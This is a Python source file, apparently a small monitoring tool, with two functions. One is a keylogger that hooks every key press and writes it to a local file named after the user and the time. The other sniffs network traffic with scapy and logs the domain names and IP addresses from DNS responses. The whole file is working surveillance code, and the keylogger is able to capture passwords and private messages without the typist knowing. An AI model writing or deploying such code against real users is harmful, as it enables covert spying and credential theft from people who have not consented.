from utilities import current_time, user_name, active_interface
import logging
import keyboard
import scapy.all as scapy

#key logger
def key_logger():
    print("Key Logger start and running.. \n ")
    # Set up the logging configuration
    logging.basicConfig(filename="keylog-"+user_name()+current_time()+".txt", level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # define a callback function to process the keystrokes
    def on_key_press(event):
        # get the name of the pressed key
        key = event.name
        # write the keystroke to the log file
        logging.info(key)
    # hook the keyboard events with the callback function
    keyboard.on_press(on_key_press)
    # start the hook and keep the script running
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        exit(0)


#dns logger
def dns_logger():
    print("DNS Quary Logger start and running.. \n ")
    # Set up the logging configuration
    logging.basicConfig(filename='dnslog-'+user_name()+current_time()+'.txt', level=logging.INFO, filemode='a', format='%(asctime)s: %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    # Define a function to process each packet
    def process_packet(packet):
        # Check if the packet has a DNS layer and a DNS response
        if packet.haslayer(scapy.DNS) and packet[scapy.DNS].qr == 1:
            # Check if the packet has any answers in the DNS response
            if packet[scapy.DNS].an is not None:
                # Loop through each answer in the DNS response
                for answer in packet[scapy.DNS].an:
                    # Check if the answer is an A record
                    if answer.type == 1:
                        # Get the domain name and the IP address from the answer
                        domain = answer.rrname.decode('utf-8')
                        ip = answer.rdata
                        # Log the domain name and the IP address
                        logging.info(f'A record: {domain} -> {ip}')
                    # Check if the answer is an AAAA record
                    elif answer.type == 28:
                        domain = answer.rrname.decode('utf-8')
                        ip = answer.rdata
                        logging.info(f'AAAA record: {domain} -> {ip}')
                    # # Check if the answer is an CNAME record
                    # elif answer.type == 5:
                    #     cname = answer.rdata.decode('utf-8')
                    #     logging.info(f'CNAME record: {domain} -> {cname}')
                    # # Check if the answer is an MX record    
                    # elif answer.type == 15:
                    #     exchange = answer.exchange.decode('utf-8')
                    #     preference = answer.preference
                    #     logging.info(f'MX record: {domain} -> {exchange} with preference {preference}')
                    # # Check if the answer is an NS record
                    # elif answer.type == 2:
                    #     ns = answer.rdata.decode('utf-8')
                    #     logging.info(f'NS record: {domain} -> {ns}')

    # Sniff packets on the network interface and pass them to the process_packet function
    try:
        scapy.sniff(iface=active_interface(), store=False, prn=process_packet)
    except KeyboardInterrupt:
        exit(0)